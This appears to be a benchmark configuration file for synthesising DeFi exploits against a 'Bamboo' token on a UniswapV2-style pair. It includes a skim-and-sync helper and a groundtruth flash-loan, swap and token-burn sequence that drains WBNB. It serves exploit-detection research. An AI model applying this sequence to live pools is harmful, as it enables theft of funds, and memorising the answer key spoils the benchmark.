# Information for benchmarks building.
project_name: "Bamboo"

ctrt_name2cls:
  - ["wbnb", "WBNB"]
  - ["bamboo", "Bamboo"]
  - ["weth", "WETH"]
  - ["pair", "UniswapV2Pair"]
  - ["factory", "UniswapV2Factory"]
  - ["router", "UniswapV2Router"]

ctrt_name2deploy:
  - ["weth", ""]
  - ["wbnb", ""]
  - ["bamboo", "new Bamboo()"]
  - ["pair", ""]
  - [
      "factory", 
      "new UniswapV2Factory(
      address(weth),
      address(pair),
      address(0x0),
      address(0x0)
      )",
    ]
  - [
      "router", 
      "new UniswapV2Router(
      address(factory), 
      address(weth))",
    ]
    
extra_actions:
 - "function burn_bamboo_pair(uint256 amount) internal eurus {
    bamboo.transfer(address(pair), amount);
    pair.skim(attacker);
    pair.sync();
    bamboo.transfer(address(pair), amount);
    pair.skim(attacker);
    pair.sync();
    }"

extra_deployments:
  - "bamboo.afterDeploy(address(router), address(pair), address(factory));"

extra_statements:
  - "vm.warp(blockTimestamp);
    vm.roll(29668034);"

attack_goal_str: "wbnb;1e6"

groundtruth:
  - ["borrow", "wbnb", "owner", "4000 ether"]
  - ["swap", "pair", "attacker", "wbnb", "bamboo", "155890849999929463804", "pair.getAmountOut(155890849999929463804, address(wbnb))"]
  - ["burn", "bamboo", "pair", "54033870967101818317"]
  - ["swap", "pair", "attacker", "bamboo", "wbnb", "bamboo.balanceOf(attacker)", "pair.getAmountOut(bamboo.balanceOf(attacker), address(bamboo))"]
  - ["payback", "wbnb", "owner", "4000 ether"]

# Information for search space building.
roles:
  "wbnb":
    is_asset: true
    is_erc20: true
    is_stablecoin: true
  "bamboo":
    is_asset: true
    is_erc20: true
    is_stablecoin: true
  "pair":
    is_swappair: true
    is_uniswap: true
    token_pair: ["wbnb", "bamboo"]
    support_swaps:
      "wbnb": ["wbnb", "bamboo"]
      "bamboo": ["wbnb", "bamboo"]
    is_oracle: true
    oracle: "pair"

pattern: "Token burn"
